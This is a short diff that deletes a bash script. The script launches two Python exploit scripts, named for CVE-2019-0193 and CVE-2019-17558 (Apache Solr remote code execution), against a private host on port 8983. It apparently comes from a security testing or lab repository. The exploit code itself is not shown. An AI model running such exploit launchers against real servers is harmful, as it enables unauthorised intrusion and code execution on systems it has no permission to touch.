@@ -1,6 +1,0 @@
-#!/usr/bin/bash
-SHELL_FOLDER=$(cd "$(dirname "$0")";pwd)
-
-python3 $SHELL_FOLDER/cve-2019-0193_cmd.py 192.168.1.103:8983 
-python3 $SHELL_FOLDER/cve-2019-17558_cmd.py 192.168.1.103:8983
-
